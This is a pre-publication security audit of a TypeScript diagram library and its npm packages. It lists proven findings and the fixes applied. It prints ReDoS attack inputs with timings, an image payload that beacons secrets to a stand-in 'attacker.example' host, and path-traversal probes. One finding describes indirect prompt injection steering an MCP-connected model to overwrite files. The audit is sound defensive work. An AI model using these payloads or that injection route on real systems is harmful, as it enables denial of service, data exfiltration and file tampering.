# Nodus (`@nodus-dev/*`) — Pre-Publication Security & Readiness Audit

**Date:** 2026-07-22 · **Target:** the working tree at `mainline` (uncommitted modifications present; nothing pushed) · **Scope:** publication = `changeset publish` of 18 npm packages + an optional static demo artifact. There is **no hosted SaaS / server / auth / database** — the classic web-app attack surface (CSP headers, Supabase/RLS, CORS-with-credentials, server-side rasterization) does not exist here and was redirected to the surfaces that do.

**Method:** Phase-0 reconnaissance corrected the audit brief's assumptions (this is a Canvas-2D engine with a *hand-rolled* Mermaid text parser — **no `mermaid.js`, no DOMPurify, no deep-merge lib, no puppeteer/mmdc/resvg/sharp, no server**), then six independent read-only lanes each **proved findings by execution** (timing runs, rendered payloads, crafted inputs) rather than assertion. Repro scripts live under `/home/ali/.claude/jobs/d42f7bf2/tmp/lane{A..F}/`. No application code was modified.

---

## Remediation applied — 2026-07-22 (same day)

The code-side blockers were fixed and verified in this session (with fail-before/pass-after regression tests). Gates after remediation: **`typecheck` clean · `test` 717/717 (98 files, +16 tests) · `build` 18/18 · `verify:render` green**.

| Item | Status | What changed |
|---|---|---|
| **H1** stencils | ✅ FIXED | `'stencils'` added to `scripts/build-all.mjs` order (after `core`); `pnpm build` now builds 18/18 and emits `packages/stencils/dist`. |
| **H2** `/\s+$/` ReDoS | ✅ FIXED | `from-mermaid` `cleanLines` uses `.trimEnd()`; regression asserts a 100k-space input parses <2s (was 7.4s). |
| **H3** inline-link ReDoS | ✅ FIXED | inner label class bounded `[^|>\n]{0,200}` in both `--`/`==` and `-.` forms; regression asserts 30k-operator input <2s (was 8.4s). |
| **H4** icons-cloud | ⏸ HELD | `@nodus-dev/icons-cloud` marked `private:true` with a `_publishHold` note → `changeset publish` skips it; the other 17 ship. No published package depends on it (react is decoupled). Licensing decision still pending. |
| **M1** deep-nesting DoS | ✅ FIXED | `restore()` rejects records nesting deeper than `MAX_NEST_DEPTH=256` (iterative, stack-safe check) → protects the `diff`/`share`/`autosave` native-`JSON.stringify` sinks at the trust boundary. |
| **M2** input-size caps | ✅ FIXED | byte/element caps added: `fromMermaid` (`MAX_MERMAID_BYTES`), `parseSnapshot` (`MAX_SNAPSHOT_BYTES`), `decodeScene` zero-click `#scene=` (`MAX_SCENE_BYTES`), `import-infra` (`MAX_IMPORT_BYTES`/`MAX_IMPORT_ELEMENTS`), `text-to-diagram` (`MAX_SPEC_ELEMENTS`). |

**Readiness items also fixed (2026-07-22):** M3 `SECURITY.md` added (with a documented limits & privacy policy) · M4 "parsed locally — don't paste secrets" note added to the import modal · M6 icons-cloud description corrected to state it bundles derived provider artwork · M7 exported SVG now emits `role="img"` + `<title>` + `aria-label` (with a `title` option on `RenderSVGOptions`), regression-tested.

**Still open (need a human decision):** H4 icons-cloud licensing (package is held via `private:true`) · **M5 real `repository.url` across all 18 manifests** (blocked on the final repo slug / project name) · all L-series (post-publish hardening). The findings below are the original audit record.

---

## Verdict: **SHIP-WITH-FIXES** — do **not** run `changeset publish` today

There is **no Critical finding** — no RCE, no committed-secret leak, no consumer-reachable dependency CVE, and no live-app XSS. The engine is fundamentally sound: 701/701 tests green, `tsc --strict` clean, a tiny permissive dependency tree with an integrity-hashed lockfile, strong publish hygiene, and **zero network egress** (fully client-side). Two previously-fixed P0s were re-verified: the **SVG `animateFlow` XSS fix is complete** (could not be defeated) and the **documented Mermaid ReDoS is fixed** for its exact repro.

But publishing today would ship (a) a **broken package**, (b) a library with **two live ReDoS**, and (c) a package with an **unresolved trademark question**. Those must close first. Ordered blocker list:

| # | Blocker | Severity | Effort | Owner |
|---|---|---|---|---|
| 1 | `@nodus-dev/stencils` never builds → `changeset publish` pushes a broken/empty package | HIGH | S | dev |
| 2 | Two live ReDoS in published `@nodus-dev/from-mermaid` (untrusted input, main-thread freeze) | HIGH ×2 | S each | dev |
| 3 | `@nodus-dev/icons-cloud` redistributes real AWS/Azure/GCP trademarked artwork | HIGH | decision | **human/counsel** |
| 4 | Publication-hygiene MEDIUMs: `SECURITY.md`, privacy note, real repo URL, SVG a11y, fix icons-cloud description | MEDIUM | S each | dev |

Blockers 1–2 are one-line code/config fixes with proven results. Blocker 3 is a **decision only a human can make** (confirm provider terms permit *registry redistribution*, gate to placeholder packs, or hold that one package back — the other 17 need not wait). Everything below MEDIUM is post-publish hardening.

**Meta-finding (drives where to look next):** the two ReDoS Highs and MEDIUM-1 share a root cause — the 2026-07-22 QA fixes were written against the *repro that found each bug*, not the *invariant it violated*, leaving structurally-identical siblings live. Re-frame those fixes against the invariant, not the payload.

---

## Severity inventory

- **Critical:** 0
- **High:** 4 (H1 build blocker · H2/H3 ReDoS · H4 licensing)
- **Medium:** 7
- **Low:** 13
- **Info / positives:** re-verified clean surfaces + hardening notes

---

## HIGH

### [HIGH] H1 — `@nodus-dev/stencils` is omitted from the release build → broken npm publish
- **Category:** Build
- **Location:** `scripts/build-all.mjs:10` (hardcoded `order` array) · `packages/stencils/package.json`
- **Status:** proven (Lane F)
- **Repro:** `pnpm build` prints `▸ building @nodus-dev/<pkg>` for 17 packages; `stencils` never appears → `ls packages/stencils/dist` = no dist. The package is `private:false` with `publishConfig` pointing `main`/`types` at `./dist/*` and `files:["dist"]`; `dist/` is gitignored repo-wide (Lane D: 0 tracked dist files) so there is **no committed fallback**. `release` = `pnpm build && changeset publish`.
- **Impact:** Publication blocker. `changeset publish` would push `@nodus-dev/stencils@0.1.0` with every entrypoint pointing at files that were never built → broken/empty package on npm (or a publish-time failure).
- **Fix:** Decide intent — if stencils ships, add `'stencils'` to the `order` array (after `core`); if not, add `"private": true`. **Durable fix:** derive the build list (and `verify-dist.mjs`, which only covers 5/18) from the workspace's `private:false` set so the two can't drift again.
- **Effort:** S

### [HIGH] H2 — ReDoS: `/\s+$/` trailing-whitespace strip runs on every input line (brand-new, unfixed)
- **Category:** ReDoS
- **Location:** `packages/from-mermaid/src/index.ts:45` (`cleanLines`: `.replace(/%%.*$/,'').replace(/\s+$/,'')`) — untrusted mermaid string → `String.replace(/\s+$/,'')`
- **Status:** proven (Lane A, `tmp/laneA/isolate.ts`)
- **Repro:** isolated `/\s+$/` on `" ".repeat(N)+"x"`: N=20k→278ms, 40k→1131ms, 80k→4408ms, 160k→**18,598ms** (clean n², ~4× per doubling). Full pipeline `fromMermaid('flowchart LR\n'+' '.repeat(100000)+'x')` = **7453ms** (attribution airtight — the inline-link regex contributes 0.6ms).
- **Impact:** Any untrusted mermaid source (editor paste, `importMermaid`, or the **MCP `import_mermaid` tool**) with one line of a long whitespace run + any non-whitespace char freezes the main thread. `\s` matches tab/vtab/ff/ideographic-space too (not ASCII-limited). Runs in `cleanLines`, the shared first step **before** kind detection → affects all diagram kinds. ~100KB→7.4s, ~350KB→~90s. The P0 fix and its 4000-space regression test never covered this regex.
- **Fix:** `index.ts:45` — replace `.replace(/\s+$/,'')` with `.trimEnd()` (behavior-equivalent since lines are already `\n`-split; O(n)). Verified linear: 0.00–0.31ms up to N=640,000.
- **Effort:** S

### [HIGH] H3 — ReDoS: inline-link normalization still O(n²) on repeated `--`/`==` operators (the P0 fix was incomplete)
- **Category:** ReDoS
- **Location:** `packages/from-mermaid/src/index.ts:181-182` (label class `([^\s|>][^|>\n]*[^\s|>]|[^\s|>])`) — a flowchart statement → `.replace(INLINE, …)`
- **Status:** proven (Lane A, `tmp/laneA/isolate2.ts`, driven via public API in `redos.ts §E`)
- **Repro:** line `'A '+'-- '.repeat(N)`: N=8000→481ms, 32000→**7790ms**, 64000→**30,762ms** (n²). Public-API `fromMermaid('flowchart LR\nA -- -- … --')` N=32000→**8373ms**.
- **Impact:** The label class `[^|>\n]*` still swallows operator chars (`-`,`=`,`.`,space), so a line of many `--`/`==` tokens with no arrow makes each of O(n) match-starts re-backtrack the remaining line → O(n²). ~96KB → 7.7s freeze. Same reachability as H2 (published lib + MCP). Directly refutes the BUGS.md "linear" claim for this regex — the fix closed only the single-space shape.
- **Fix:** bound the inner quantifier in **both** the `--`/`==` and dotted `-.` forms (mermaid edge labels are short): `[^|>\n]*` → `[^|>\n]{0,200}`. Verified: N=32000 drops 7790ms → **40.7ms**. Raise the regression test to ~100KB (or assert linear scaling) so residual quadratics can't pass.
- **Effort:** S

### [HIGH] H4 — `@nodus-dev/icons-cloud` redistributes real AWS/Azure/GCP trademarked artwork
- **Category:** License
- **Location:** `packages/icons-cloud/` (`svg/**`, `src/generated/*-pack.ts`, shipped `dist/`)
- **Status:** facts **proven**; legal conclusion **unverified** (Lane D is not counsel)
- **Repro:** the committed glyphs are the *genuine* official provider icons, not placeholders — `svg/aws/Arch_Amazon-EC2_48.svg` carries AWS brand-orange `fill="#ED7100"`, the official EC2 path, and the official `Icon-Architecture/48/Arch_Amazon-EC2_48` title. 92 provider SVGs tracked (aws 36 / azure 37 / gcp 19). `npm pack --dry-run` → derived vector packs ship in `dist` (`aws.cjs 124kB`, `azure.cjs 187kB`, `gcp.cjs 78kB`); `grep ED7100 dist/*.cjs` confirms real provider data in the shipped bundle.
- **Impact:** Publishing redistributes copyrighted + trademarked provider artwork as a standalone library. Provider icon terms generally permit *end-users making diagrams*, not a third party *redistributing the marks via a package registry*. Single largest publication-legal exposure in the repo.
- **Mitigation already in place (strong — credit it):** dual-body `LICENSE` (MIT for code + explicit carve-out that MIT does **not** cover artwork/derived packs), `NOTICE` with per-provider attribution + non-endorsement disclaimer, `LICENSES/{aws,azure,gcp}.md`, `provenance.json`, `license:"SEE LICENSE IN LICENSE"` (correctly not MIT), and `files` excludes raw `svg/`.
- **Fix:** (1) written confirmation each provider's current icon terms permit *registry redistribution* before first publish; or (2) ship **empty/placeholder** packs by default and have consumers run `pnpm build:icons` after vendoring artwork themselves (moves the redistribution act to the consumer — matches the package's own stated design); or (3) hold `@nodus-dev/icons-cloud` back from the first publish while the other 17 ship. Also fix M6 (misleading description).
- **Effort:** M (legal review) / M (placeholder-gating refactor)

---

## MEDIUM

### [MEDIUM] M1 — Deep-nesting DoS: `stableStringify` is stack-safe, but three sibling paths still serialize untrusted records via native `JSON.stringify`
- **Category:** DoS
- **Location:** `packages/core/src/diff/index.ts:30` (`sameContent`) · `packages/react/src/persistence.ts:30` (`serializeDocument`) · `packages/react/src/share.ts:50` (`encodeScene`). Source: any `.nodus.json` / `#scene=` with deeply nested `props`/`style`/`meta`.
- **Status:** proven (Lane C, `tmp/laneC/05b-sinks.ts`)
- **Repro:** a 60,145-byte snapshot with a node whose `props` nests ~6000 deep is accepted by `JSON.parse` (iterative) and `restore()` (iterative), then all three sinks throw `RangeError: Maximum call stack size exceeded`. `pnpm exec tsx packages/cli/src/bin.ts diff deepA.nodus.json deepB.nodus.json` → uncaught overflow, non-zero exit — the git-native `nodus diff` review flow (the moat).
- **Impact (honestly scoped):** `nodus diff` = uncaught CLI crash · "Copy share link" (`main.tsx:880`) = throws on click / unhandled rejection · review modal = crashes render when a loaded id also exists in the baseline · autosave = throw caught → silent save-failure. Diagrams CI runs `fmt`/`render` (iterative, safe), **not** `diff`, so not an automated-CI crash today.
- **Fix:** route every serialization of untrusted records through the iterative `stableStringify` (replace native `JSON.stringify` in the three sites), **and/or** add a nesting-depth cap (~256) in `restore()` that rejects at the trust boundary. (This is the same "fix the invariant, not the repro" gap as H3.)
- **Effort:** M

### [MEDIUM] M2 — No input-size / element-count cap at any parse or load boundary (main-thread; includes zero-click `#scene=`)
- **Category:** DoS / Config
- **Location:** importers: `from-mermaid/src/index.ts:364`, `import-infra/src/index.ts:160` & `:306`, `text-to-diagram/src/index.ts:87` (Lane A) · load paths: `react/src/share.ts:41/58` (`atob`+`parseSnapshot`, zero-click via `main.tsx:665`), `persistence.ts`, `use-branch.ts:127`, `mcp/src/session.ts:407`, CLI commands (Lane C)
- **Status:** proven — absence confirmed by grep + timing (Lane A `probes.ts §3c/§3d`; Lane C `05b`)
- **Repro:** 2,000,000 flat TF resources → `fromTerraform` runs to completion in **7103ms** with no early rejection; 200k-edge mermaid → 896ms; the fully attacker-controlled `#scene=` fragment `atob`+`JSON.parse`+`restore`-walks on the main thread with no upper bound.
- **Impact:** Even after the ReDoS fixes, a large-but-linear untrusted input (or a single crafted share link) exhausts CPU/memory synchronously → tab freeze / OOM, zero interaction beyond opening a link. Amplifies H2/H3.
- **Fix:** cheap upfront guards at each boundary (e.g. `if (src.length > 512_000) throw`; a resource/node-count cap throwing `ImportError`/`DiagramSpecError`; cap the `#scene=` fragment before decode, e.g. reject > 5–10MB → typed "document too large"). For the browser host, run importers/parse in a Web Worker so a pathological input can't wedge the UI thread.
- **Effort:** M

### [MEDIUM] M3 — No `SECURITY.md` (no vulnerability-disclosure policy)
- **Category:** Docs · **Location:** repo root (absent) · **Status:** proven (Lanes D, F; independently confirmed)
- **Impact:** Expected for public OSS, doubly so here (two P0 security bugs were fixed days ago). No disclosure channel for the next reporter.
- **Fix:** Add root `SECURITY.md` with a private-disclosure contact + supported-versions note. · **Effort:** S

### [MEDIUM] M4 — No privacy / "processing is local, don't paste secrets" note despite Terraform-state & K8s import
- **Category:** Privacy · **Location:** import UI (`examples/browser/src/import-editor.tsx`, `main.tsx`), README/docs · **Status:** proven (Lane F)
- **Impact:** Users paste `terraform show -json` (state/plan) and K8s manifests — routinely secret-bearing. Lane F verified the reassuring truth (**zero network egress, 100% client-side**) but it's never told to the user, and there's no caution against pasting sensitive state. Good posture, zero communication.
- **Fix:** one line in the import modal ("Parsed locally in your browser — nothing is uploaded. Avoid pasting secrets/state you don't want on-screen.") + a short privacy paragraph in README/SECURITY. · **Effort:** S

### [MEDIUM] M5 — `github.com/ahmazin/nodus` placeholder `repository.url` in all 18 manifests
- **Category:** Config · **Location:** every `packages/*/package.json` · **Status:** proven (Lanes D, F)
- **Impact:** Every published package points to a non-existent repo — breaks the npm "Repository" link, provenance linkage, and issue-reporting path. (Known-open "repo URL" decision.)
- **Fix:** set the real slug (+ `homepage`/`bugs`) in all 18 before publish. · **Effort:** S

### [MEDIUM] M6 — `@nodus-dev/icons-cloud` description falsely claims "fixture placeholders"
- **Category:** License / Config · **Location:** `packages/icons-cloud/package.json` `description` · **Status:** proven (Lane D)
- **Impact:** Description reads "Ships fixture placeholders…" but the package bundles/redistributes the **real** derived provider artwork. Understates what ships; can mislead the very risk assessment in H4.
- **Fix:** correct the description to state it bundles derived provider artwork under each provider's icon terms — or make the claim true by shipping placeholders (H4 fix #2). · **Effort:** S

### [MEDIUM] M7 — Exported SVG has no `role="img"` / `<title>` / `aria-label`
- **Category:** a11y · **Location:** `packages/core/src/renderer/svg-context.ts:221` (`toSVG`) · **Status:** proven (Lane F)
- **Impact:** The root `<svg>` carries only `xmlns/width/height/viewBox`. Exported SVGs — a headline "diagrams you can code-review" artifact — have no accessible name and are announced as unlabeled graphics.
- **Fix:** emit `role="img"` + `<title>` (diagram name or a `title` opt on `RenderSVGOptions`) + `aria-label`. · **Effort:** S

---

## LOW

### [LOW] L1 — `restore(null)` / `restore(undefined)` throws, violating the "never throws on parseable input" contract
- **Category:** Config · **Location:** `packages/core/src/serialization/index.ts:269`; CLI mirror `packages/cli/src/commands/fmt.ts:22` · **Status:** proven (Lane C, `07-null-and-coords.ts`)
- **Repro:** `restore(null)` → `TypeError: Cannot read properties of null (reading 'typeVersions')`. `echo 'null' > x.nodus.json; nodus fmt --check x.nodus.json` → raw `TypeError`, exit 1. `null`/`42`/`[]` are all valid JSON reaching CLI/MCP/`computeBranch`.
- **Impact:** `diagrams.yml` runs `nodus fmt --check` on every changed `*.nodus.json` in a PR → a file containing literal `null` fails CI with a raw stack instead of a clean "invalid document." Self-inflicted (own CI), already non-zero exit, no data exposure.
- **Fix:** guard the top of `restore()` (non-object/array → `onError` + empty result); mirror in `canonicalizeFile`. · **Effort:** S

### [LOW] L2 — `diagram.image` external `href` → tracking-beacon / exfil in exported `.svg`
- **Category:** Config (privacy/SSRF-in-viewer) — **not** code execution · **Location:** `packages/preset-diagrams/src/image.ts` (`ImageNodeProps.src` doc'd "data URI **or a URL**") → `packages/core/src/renderer/svg-context.ts:556-563` (`drawImage`→`<image href>`) · **Status:** proven (Lane B, `tmp/laneB/dump.ts`)
- **Repro:** image node `props.src='https://attacker.example/beacon?d=SECRET'` → `renderSVG` emits `<image href="https://attacker.example/beacon?d=SECRET" …/>` verbatim. Breakout via `src` (`x"/><script>`) IS neutralized by `escapeAttr` (so not XSS).
- **Impact:** when the exported `.svg` is opened in a browser (download/clipboard), `<image href>` fires an outbound GET to an author-chosen URL. Most relevant to the git-native moat: a malicious `*.nodus.json` in a PR embeds an external image ref; anyone opening the rendered SVG pings the attacker (viewer-IP deanon; query-string exfil). No script executes (`<image>` is secure-static), hence Low.
- **Fix:** scheme-gate `drawImage` href before emit — `data:` (optionally `blob:`/same-origin) only; for `http(s)` inline-fetch-and-base64 at export or fall to the dashed placeholder. Escaping can't fix this — a URL stays a fetch capability when escaped. · **Effort:** S

### [LOW] L3 — MCP `export_png` can overwrite any existing file inside cwd with PNG bytes
- **Category:** Config (arbitrary-write, contained) · **Location:** `packages/mcp/src/session.ts:360-383` (`path`→`containedPath` `:46-54`→`writeFileSync` `:379`), published `@nodus-dev/mcp` · **Status:** proven (Lane E, containment logic executed)
- **Repro:** `export_png {"path":"package.json"}` → `containedPath` returns the in-cwd path (allowed) → `writeFileSync` clobbers it with PNG bytes. `../sibling.png`, `/etc/passwd`, `cwd/../evil.png` are all correctly **rejected**; the gap is *within* cwd, and no `.png` extension is enforced.
- **Impact:** an MCP client — or, via indirect prompt injection from a malicious imported diagram's labels steering the model — can overwrite `package.json`/`.ts` source with binary PNG: local tamper/DoS, contained to the working dir.
- **Fix:** after `containedPath`, require the resolved path under `session.exportsDir` (not bare cwd), or `if (!/\.png$/i.test(contained)) return fail(...)` + refuse-if-exists-and-not-ours. · **Effort:** S

### [LOW] L4 — Anthropic API key persisted in `localStorage` (example BYOK)
- **Category:** Secrets · **Location:** `examples/browser/src/describe-diagram.tsx:18,76-105` — **`examples/` only, `private:true`, not shipped** · **Status:** proven (Lane E; independently confirmed)
- **Evidence:** request target is a hardcoded literal `https://api.anthropic.com/v1/messages` (diagram/model content cannot redirect it → **no SSRF**); key is not logged, rendered only in a `type="password"` input, and **never** serialized into `.nodus.json` or the `#scene=` URL. Residual: any same-origin XSS could read the key from `localStorage`, and it persists across sessions. `anthropic-dangerous-direct-browser-access:true` used correctly.
- **Fix:** acceptable for a demo given the in-UI note; to harden, use `sessionStorage`/in-memory + a caveat that an LS key is page-script-readable. · **Effort:** S

### [LOW] L5 — `serve-playground.mjs` binds `0.0.0.0` by default and sets no security headers
- **Category:** Config · **Location:** `scripts/serve-playground.mjs:11,16` — **dev script, not published** · **Status:** proven (Lane E)
- **Impact:** listens on all interfaces (any LAN peer can GET the playground); no `X-Content-Type-Options: nosniff`. The server ignores `req.url` (re-reads one fixed file) → **no path traversal**; the asset has no secrets, so exposure is low.
- **Fix:** default `HOST` to `127.0.0.1` (matching doc-server) + add `nosniff`. · **Effort:** S

### [LOW] L6 — Six dependency advisories — all dev-toolchain, none consumer-reachable
- **Category:** Supply chain · **Location:** dev deps (vitest/vite/esbuild) · **Status:** proven (Lane D, `pnpm audit --json`)
- **Repro:** `{critical:1, high:1, moderate:3, low:1}`, **every** finding `dev:true` — CRITICAL `vitest <3.2.6` (UI-server arb file read/exec), HIGH `vite <=6.4.2` (`server.fs.deny` bypass, Windows), 3× MODERATE esbuild/vite, 1× LOW esbuild. All root through vitest/vite/esbuild; none in any package's `dependencies`.
- **Impact:** **not reachable by consumers of published packages** — test/build toolchain only, never in `dist`. Not a publish blocker.
- **Fix:** bump `vitest` → ≥3.2.6 (2→3 major) and let vite/esbuild float to patched, for dev-machine safety. · **Effort:** M

### [LOW] L7 — `@nodus-dev/layout-elk` transitively includes EPL-2.0 (`elkjs`)
- **Category:** License · **Location:** `packages/layout-elk` → `elkjs@0.9.3` (EPL-2.0), unmodified · **Status:** proven (Lane D)
- **Impact:** EPL-2.0 is weak (file-level) copyleft; as an unmodified dependency it does **not** force relicensing Nodus's MIT code, but installing `@nodus-dev/layout-elk` brings EPL-2.0 into a consumer tree. Pure-permissive consumers can use `layout-dagre` (MIT) / `layout-tree` / `layout-force` (ISC).
- **Fix:** none required; optionally note it in the layout-elk README. · **Effort:** S

### [LOW] L8 — Sourcemaps ship in every published tarball
- **Category:** Config · **Location:** all `packages/*/dist/*.map` · **Status:** proven (Lane D, `npm pack --dry-run`)
- **Impact:** not a secret leak (maps resolve to generated TS / derived vector data — no `/home/`, `/Users/`, absolute paths; grep-confirmed). Pure bloat (icons-cloud maps ≈ half its 763kB packed size) + source-structure exposure.
- **Fix:** `sourcemap:false` in the published `tsup.config.ts` (or exclude `**/*.map`). · **Effort:** S

### [LOW] L9 — No npm provenance / no automated publish workflow
- **Category:** Supply chain · **Location:** `.github/workflows/` · **Status:** proven (Lane D)
- **Impact:** `release` runs `changeset publish` manually/locally → no sigstore provenance attestation (`--provenance` needs CI+OIDC); a local npm token is the sole trust anchor.
- **Fix:** add a `changesets/action` workflow publishing from CI with `npm publish --provenance` + automation token + 2FA (needs a valid repo URL first). · **Effort:** M

### [LOW] L10 — Modal dialogs set `aria-modal="true"` but have no focus trap
- **Category:** a11y · **Location:** `packages/react/src/command-palette.tsx`, `review-modal.tsx` · **Status:** proven (Lane F)
- **Impact:** Escape-to-close, initial focus, and `role="dialog"`/`aria-modal` are handled, but Tab is not trapped — keyboard/AT users can Tab onto the background canvas. (Chrome a11y is otherwise strong.)
- **Fix:** add a Tab-cycle trap while open. · **Effort:** M

### [LOW] L11 — No `CONTRIBUTING` / `CODE_OF_CONDUCT`
- **Category:** Docs · **Location:** repo root (absent) · **Status:** proven (Lane F)
- **Fix:** add `CONTRIBUTING.md` (source-first dev loop: `pnpm typecheck`/`test`/`verify:render`) + a CoC. · **Effort:** S

### [LOW] L12 — Perf ceilings & input limits documented only in `BUGS.md`, not user-facing
- **Category:** Docs/Perf · **Location:** `BUGS.md` vs `README.md`/`docs/` · **Status:** proven (Lane F)
- **Impact:** ceilings are tracked internally (60fps to ~150–300 on-screen nodes; toPNG 13.6s@10k; `DAGRE_MAX_NODES=1500`, `ELK_MAX_NODES=8000`, import `MAX_DEPTH=1000`) but never surfaced, so a consumer only learns the ceiling by hitting a thrown layout error.
- **Fix:** a short "Scale & limits" README section (recommended node ceilings + the exported guard constants). · **Effort:** S

### [LOW] L13 — tsup CJS "named and default exports together" warning (4 packages)
- **Category:** Build · **Location:** build log (4×) · **Status:** proven (Lane F)
- **Impact:** CJS `require()` consumers may need `.default`; cosmetic ergonomics.
- **Fix:** set `output.exports:"named"` (or drop the default export) in the affected tsup configs. · **Effort:** S

---

## INFO / hardening notes

- **No Dependabot/Renovate** (`.github/dependabot.yml`, `renovate.json` absent) — the dev-toolchain CVEs will drift; add one. (Lanes D, F)
- **`verify-dist.mjs` covers only 5 of 18 packages** (`['core','icons-cloud','preset-infra','layout-dagre','react']`) — the dist safety net has a hole exactly where H1 lives; broaden or assert every non-private package emitted a dist. (Lane F)
- **Missing npm metadata** (`homepage`/`bugs`/`author`) and the README still flags "Working name: Nodus" — confirm the name before publish. (Lanes D, F)
- **`spawndamnit@3.0.1` reports "Unknown" license** — transitive of `@changesets/cli` (dev only, MIT file in-package); never shipped. (Lane D)
- **CI workflows are well-hardened** (my own review): top-level `permissions: contents: read`, plain `pull_request` (no `pull_request_target` secret-exposure), and PR-controlled values passed via `env:`/`process.env` — never `${{ }}`-interpolated into a shell body (script-injection avoided by design, documented inline). Nits (Info): third-party actions pinned to major tags (`@v4`) not full commit SHAs; the `$GITHUB_OUTPUT` heredoc uses a static `EOF` delimiter (practically unreachable via a `*.nodus.json` filename).

---

## Re-verified clean surfaces (adversarially tested — these are the load-bearing positives)

- **SVG `animateFlow` `flow.color` XSS (BUGS.md P0):** fix **CONFIRMED complete** — could not be defeated; escaping is centralized/total (`escapeText` for text, `escapeAttr`/`attr` for every attribute). No `<style>`/CSS sink, no `<a>`/`foreignObject`, and **no `innerHTML`/`dangerouslySetInnerHTML` anywhere** → the whole SVG surface is bounded to "XSS in a standalone-opened file," never "XSS in the running app." (Lane B)
- **Documented Mermaid ReDoS (single-space `--`/`==`/`-.`):** **CONFIRMED fixed** (0.6ms at N=160k, was ~24s). *But* two other quadratics remain — H2/H3. (Lane A)
- **Prototype pollution:** **clean** across 9 import/parse paths *and* the deserialization path (real own-`__proto__` keys via raw-JSON parse). Structurally safe — parsed keys index `Map`/`Set`, never `obj[key]=v` on a plain object. (Lanes A, C)
- **`stableStringify` iterative** (100k-deep OK), **`restore()` defensive** (null-record/non-array/dup-id/schemaVersion-bounds/non-finite-coord all handled + `onError`), and the **`#scene=` path uses the same defensive `restore()`**. (Lane C)
- **Terraform recursion cap** (`MAX_DEPTH=1000` → catchable `ImportError`, not `RangeError`) and **YAML alias-bomb / billion-laughs** (`yaml@2.9.0` `maxAliasCount=100`) — both **effective**. (Lane A)
- **Secrets:** clean in the working tree **and** across all 153 commits (history-aware); no hardcoded key. **Lockfile integrity:** 366/366 sha512 hashes, zero non-registry resolutions, CI `--frozen-lockfile`. **Publish hygiene:** `files` allowlist + `publishConfig`, `npm pack --dry-run` proves no `src`/`*.test.*` leakage, `dist` gitignored repo-wide (no stale committed builds). **Dep tree:** 7 external runtime deps, no GPL/AGPL/LGPL/SSPL. (Lane D)
- **Gates:** `typecheck` clean, **701/701 tests** across 98 files, `verify:render` OK; importers produce sane records; **zero network egress**. (Lane F)
- **Web/MCP:** no hosted deployment exists; RemoteStore has **no SSRF** (`baseUrl` developer-set, `name` `encodeURIComponent`'d); doc-server path-traversal **proven absent** + CORS is a correct allowlist; no source maps in the example build; MCP malformed-JSON handling is crash-safe and model-output is validated before it touches the editor. (Lane E)

---

## Suggested fix order before first `changeset publish`

1. **H1** — add `stencils` to the build order (or mark private). *(S)*
2. **H2 + H3** — `.trimEnd()` and `[^|>\n]{0,200}` in `from-mermaid`; raise the ReDoS regression test to ~100KB. *(S)*
3. **M1 + M2** — route the three `JSON.stringify` siblings through `stableStringify` and/or add a `restore()` depth cap; add byte/element caps at the parse+`#scene=` boundaries. *(M)* — closes the "fix the invariant, not the repro" class.
4. **H4 + M6** — human/counsel decision on icons-cloud redistribution (or gate-to-placeholders / hold the package back) **and** fix the misleading description. *(decision)*
5. **M3/M4/M5/M7** — `SECURITY.md`, privacy note in the import modal, real repo URL across 18 manifests, `role="img"`+`<title>` on exported SVG. *(S each)*
6. Post-publish hardening: L-series (image-href scheme gate, MCP export_png guard, dev-dep bumps, sourcemaps off, provenance/CI-publish, Dependabot, focus trap, docs).
